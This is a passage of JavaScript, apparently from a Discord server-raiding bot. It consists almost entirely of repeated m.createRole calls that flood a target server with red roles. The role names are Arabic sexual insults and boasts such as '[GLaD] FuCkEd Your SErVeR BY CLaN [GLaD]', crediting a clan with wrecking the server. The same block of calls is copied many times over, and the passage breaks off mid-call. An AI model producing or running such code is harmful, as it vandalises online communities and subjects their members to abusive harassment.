        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
